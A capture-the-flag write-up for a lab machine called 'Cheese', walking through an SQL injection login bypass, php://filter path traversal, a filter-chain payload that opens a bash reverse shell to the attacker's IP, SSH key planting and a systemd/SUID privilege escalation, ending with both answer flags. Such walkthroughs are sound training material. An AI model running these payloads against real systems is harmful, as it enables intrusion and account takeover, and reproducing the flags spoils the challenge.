# Cheese CTF

### Flags

The website is about cheese: <br />
![image](https://github.com/user-attachments/assets/6570b944-15be-45be-b26f-cd57fa11a286)<br />
After moving a bit through the website and some basic enumeration, the only page that seems to be an entry point is the login page: <br />
![image](https://github.com/user-attachments/assets/3216996f-0906-4195-a5cc-c0f725089dfd)<br />
I started trying some basic SQL Injection techniques such as 'or 1=1--, but it didn't work. I even tried to use `sqlmap` but nothing, so I went back to manual enumeration. So, after one frustrating hour of trial and error, I was able to log in with the payload `' || 1=1;-- -`.<br />
The main thing that I learned with this is that, depending on the database, `||` substitutes `or`, and that it is a good practice to insert one more dash `-` to make sure that the comment symbol `--` gets parsed correctly. <br />
I am now inside an admin panel:<br />
![image](https://github.com/user-attachments/assets/7586859f-336d-46f6-8534-d2eeb665a90f)<br />
Moving a bit in the panel, I'm noticing some strange URLs:<br />
![image](https://github.com/user-attachments/assets/dc7e0d10-0957-4fca-b619-f2d165985e53)<br />
The server is using a **PHP wrapper filter**, which is a technique used to correctly read contents of a given file, even if it is encoded somehow. The first thing that came to my mind is to check for a path traversal vulnerability. So i used the following URL: `http://10.10.207.231/secret-script.php?file=php://filter/resource=../../../../../../../etc/passwd`, and it worked:<br />
![image](https://github.com/user-attachments/assets/773e114a-7848-498b-a85a-6b7329044952)<br />
Next, i tried to perform a RFI(Remote File inclusion) attack, by opening a web server on my machine and using the following URL: `10.10.207.231/secret-script.php?file=php://filter/resource=http://10.11.108.100/test.txt`. But it didn't work.
After some online search I found [this](https://github.com/synacktiv/php_filter_chain_generator/blob/main/README.md) github repo showing how to generate a php://filter payload for RCE. I copied the code in a file named `test.py` and used the following command to create a reverse shell payload: <br />
`python3 test.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.11.108.100/4444 0>&1\"'); ?>"`. <br />
So i copied the payload starting from "php://...." and put it inside the URL. So the final URL looked something like: `http://10.10.38.241/secret-script.php?file=php://filter/convert.iconv.UTF8......`. After opening a netcat listener, I got remote access(flags can be found at the end of this writeup):<br />
![image](https://github.com/user-attachments/assets/48cdd9d4-f15c-4921-ba9f-7e87c882d241)<br />
Now let's stabilize the shell:

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    CTRL+Z
    stty raw -echo; fg
    export TERM=xterm
I'm still not able to get the user flag:<br />
![image](https://github.com/user-attachments/assets/1f5bb354-80df-432c-bad4-5932ddba24cb)<br />
However, enumerating comte's home directory, I found that I have write access to his `.ssh/authorized_keys` file. Therefore, what I can do is: 
1) generate a new key pair: `ssh-keygen -t rsa -b 4096 -f mykey`
2) copy the newly generated public key inside `.ssh/authorized_keys`: `echo "ssh-rsa PUB_KEY" >> /home/comte/.ssh/authorized_keys`
3) copy the private key inside the attacker's machine and change its permissions: `chmod 600 mykey`
4) Now log into comte's account via ssh: `ssh -i mykey comte@target_IP` <br />
![image](https://github.com/user-attachments/assets/2c93d5fc-013d-4996-809c-4499d00c71cf)<br />
After using linpeas to enumerate the system, this is what comes out: <br />
![image](https://github.com/user-attachments/assets/5dcce2a5-06a3-4cc5-b1ea-381a1fcdcd32)<br />
Just like cron jobs, systemd timers can be used to execute commands or scripts at specified time intervals. Also if I run `sudo -l`, this is what I get: <br />
![image](https://github.com/user-attachments/assets/128b651b-b23e-459a-94d8-c699db08b670)<br />
If we run `cat /etc/systemd/system/exploit.service` we can see what's the task made by this service:<br />
![image](https://github.com/user-attachments/assets/adbe6605-ef83-4204-8aa1-1cd574838405)<br />
It's apparently adding the SUID bit to a binary called `xxd`. However the .timer files has a misconfigured option which I corrected: to `OnBootSec=10sec`<br />
![image](https://github.com/user-attachments/assets/5b887301-5d29-45f3-8ad5-aae480224144)<br />
After that, I run:

        sudo /bin/systemctl daemon-reload
        sudo systemctl enable exploit.timer
        sudo systemctl start exploit.timer
If I now run `find / -perm -04000 2>/dev/null`, I get a new suid binary:<br />
![image](https://github.com/user-attachments/assets/556dc4f9-815f-4aa5-9135-ac751c1c20dd)<br />
The exploitation for this binary can be easily found on [GTFObins](https://gtfobins.github.io/gtfobins/xxd/#suid):<br />
![image](https://github.com/user-attachments/assets/992fc8bb-bdd2-4553-a9eb-58dbaa12c40e)<br />
So we can exploit this SUID to read any file we want. Here's how to read root.txt:<br />
![image](https://github.com/user-attachments/assets/2fa9466e-3399-4beb-bcf9-8bc0e32e9fd4)<br />
gg wp

- What is the user.txt flag? `THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}`
- What is the root.txt flag? `THM{dca75486094810807faf4b7b0a929b11e5e0167c}`
